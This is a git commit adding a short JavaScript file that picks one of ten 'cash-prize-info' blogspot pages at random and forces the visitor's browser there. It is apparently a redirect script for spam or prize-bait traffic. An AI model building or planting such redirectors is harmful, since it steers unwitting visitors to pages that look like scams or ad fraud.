46f4305840dc90f94c1494f65ec0ba610b3fae95
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-07-24 09:09:31 +0700

    Create blogredkeadstinfo1.js

---
+++ blogredkeadstinfo1.js
@@ -0,0 +1,16 @@
+var dataUrl = [
+
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-10.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-9.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-8.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-7.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-6.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-5.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-4.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-3.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-2.html',
+'https://cashprizeinfo.blogspot.com/2026/07/cash-prize-info-1.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
